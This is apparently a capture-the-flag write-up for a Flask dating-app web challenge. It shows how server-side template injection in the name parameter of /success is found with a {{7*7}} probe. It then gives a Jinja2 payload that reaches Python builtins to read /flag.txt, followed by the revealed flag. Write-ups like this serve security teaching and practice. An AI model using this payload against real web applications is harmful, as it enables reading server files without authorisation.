# Love Profiles

Total Solves - 54

Final Points - 100

## Description
Made my own dating app as I had no matches on existing ones. Only genuine profiles allowed!

PS: Its under development so you have to wait before you can match and talk!

## Writeup
The web app doesn't have much functionality. On exploring you will realise that you can simply add profiles using `/profile` endpoint.

On successfully adding a profile, it takes you to the endpoint `/success?name=` and displays this

```
REQUEST:
/success?name=kn1gh7

RESPONSE:
Congratulations kn1gh7! Your profile has been successfully added!
View profiles here
```

As its a flask application, there is a possibility of SSTI here or on the home page. Sending a request with name as `{{7*7}}`.

```
REQUEST:
/success?name={{7*7}}

RESONSE:
Congratulations 49! Your profile has been successfully added!
View profiles here
```

There is SSTI!

Now you can use a payload like `request.__class__._load_form_data.__globals__.__builtins__.open("/flag.txt").read()`

```
REQUEST: 
/success?name={{request.__class__._load_form_data.__globals__.__builtins__.open("/flag.txt").read()}}

RESPONSE:
Congratulations CodefestCTF{1_w4n7_l0v3_bKzlvb2xi} ! Your profile has been successfully added!
View profiles here
```

## Flag
`CodefestCTF{1_w4n7_l0v3_[a-zA-Z0-9]{9}}`
